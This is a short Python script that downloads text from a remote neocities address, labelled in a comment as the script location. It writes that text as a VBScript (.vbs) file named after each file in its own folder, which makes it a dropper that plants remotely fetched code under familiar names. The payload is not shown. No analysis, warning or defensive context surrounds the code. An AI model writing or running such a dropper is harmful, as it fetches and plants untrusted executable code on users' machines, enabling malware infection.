import requests
import os

link = "https://thekoolestklub.neocities.org/sugu.txt" # script location
response = requests.get(link)
new_content = response.text

current_directory = os.path.dirname(os.path.abspath(__file__))
new_extension = ".vbs"

for filename in os.listdir(current_directory):
    base, ext = os.path.splitext(filename)
    new_file_name = base + new_extension
    file_path = os.path.join(current_directory, new_file_name)
    with open(file_path, "w") as file:
        file.write(new_content)